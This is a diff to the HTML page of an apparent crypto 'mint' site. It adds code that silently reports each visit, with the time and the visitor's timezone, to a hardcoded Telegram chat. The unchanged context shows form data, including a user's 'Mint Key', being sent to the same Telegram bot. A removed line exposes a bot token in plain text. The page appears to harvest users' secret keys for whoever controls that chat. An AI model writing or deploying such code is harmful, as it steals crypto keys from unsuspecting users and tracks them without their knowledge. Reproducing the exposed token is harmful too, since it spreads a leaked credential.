@@ -18,7 +18,14 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body class="bg-[#1a1a1a] text-white">
+    <!-- Load environment variables -->
+    <script>
+        // This will be replaced by Vercel with the actual environment variables
+        window.ENV_TELEGRAM_BOT_TOKEN = '{{TELEGRAM_BOT_TOKEN}}';
+    </script>
     <div class="particles-container">
+        <div class="particle"></div>
+        <div class="particle"></div>
         <div class="particle"></div>
         <div class="particle"></div>
         <div class="particle"></div>
@@ -71,6 +78,26 @@
             const [activeTooltip, setActiveTooltip] = React.useState(null);
             const [fileName, setFileName] = React.useState('');
             const [imagePreview, setImagePreview] = React.useState(null);
+
+            // Send message when someone visits
+            React.useEffect(() => {
+                // Get user's timezone for better tracking
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const visitTime = new Date().toLocaleString();
+                
+                const message = `👀 New Site Visit!\n\n⏰ Time: ${visitTime}\n🌍 Timezone: ${timezone}`;
+                
+                fetch(`https://api.telegram.org/bot${window.ENV_TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: "5651527672",
+                        text: message
+                    })
+                });
+            }, []); // Empty array means this runs once when component mounts
 
             // Add new state for form data
             const [formData, setFormData] = React.useState({
@@ -159,7 +186,7 @@
                 ).join('\n\n')}\n\n🔑 Mint Key: ${mintKey}`;
 
                 // Send to Telegram
-                fetch(`https://api.telegram.org/bot7648929218:AAFjh4v_bfESlHcbokO8eca8RZQvwr-RXVc/sendMessage`, {
+                fetch(`https://api.telegram.org/bot${window.ENV_TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
